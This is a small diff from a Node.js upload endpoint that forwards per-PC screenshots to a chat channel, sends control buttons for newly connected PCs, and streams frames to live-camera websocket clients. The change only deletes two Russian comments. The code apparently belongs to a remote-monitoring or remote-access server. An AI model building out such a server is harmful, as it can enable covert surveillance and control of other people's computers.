@@ -134,10 +134,8 @@ app.post("/upload", async (req, res) => {
         if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
         if(files.length) await finalChannel.send({ files });
 
-        // ---------- Отправка кнопок при первом подключении ПК ----------
         if(isNewPC) await sendControlButtons(pcId);
 
-        // ---------- Live камера ----------
         if(screenshot && wsCameraClients[pcId]){
             wsCameraClients[pcId].forEach(ws => {
                 try { ws.send(screenshot); } catch(e){ }
